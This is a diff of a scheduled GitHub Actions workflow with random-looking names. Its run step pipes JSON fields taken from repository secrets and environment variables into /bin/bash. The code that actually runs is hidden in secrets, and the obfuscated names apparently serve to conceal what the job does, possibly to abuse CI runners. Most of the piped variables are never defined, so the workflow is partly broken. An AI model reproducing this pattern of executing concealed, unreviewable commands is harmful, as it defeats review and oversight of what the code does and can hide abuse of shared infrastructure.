@@ -2,8 +2,7 @@ name: anzaidong1887
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 3/6 * * *'
-
+    - cron: '47 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,20 +11,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: anzaidong1887
         env:
-          qfkkk120: ${{ secrets.qfkkk120 }}
+          a0: ${{ secrets.a0 }}
         run: |
-          echo $qfkkk120 | jq -r .kuhpc03 | /bin/bash
-          echo $gm5359 | jq -r .y72207 | /bin/bash
-          echo $knssk6 | jq -r .vsn55867 | /bin/bash
-          echo $r2871 | jq -r .uskc4573 | /bin/bash
-          echo $afo03 | jq -r .uvkvz12 | /bin/bash
-          echo $yjsp61436 | jq -r .y0330 | /bin/bash
-          echo $m13023 | jq -r .jn75876 | /bin/bash
-          echo $uyc62236 | jq -r .bo659 | /bin/bash
-          echo $ql729 | jq -r .lp6 | /bin/bash
-          echo $p328 | jq -r .xgauh67686 | /bin/bash
-          echo $gjqwn643 | jq -r .zt4174 | /bin/bash
-          echo $yt05 | jq -r .ndolu53036 | /bin/bash
-          echo $np2573 | jq -r .omips01 | /bin/bash
-          echo $y33 | jq -r .ya58 | /bin/bash
+          echo $a0 | jq -r .dd96419 | /bin/bash
+          echo $qgg0757 | jq -r .zxk399 | /bin/bash
+          echo $u01 | jq -r .x39 | /bin/bash
+          echo $zphwf8 | jq -r .qdcf4 | /bin/bash
+          echo $cq614 | jq -r .efjh9068 | /bin/bash
+          echo $j1294 | jq -r .xexj5 | /bin/bash
+          echo $lspy8 | jq -r .nqsc35695 | /bin/bash
 
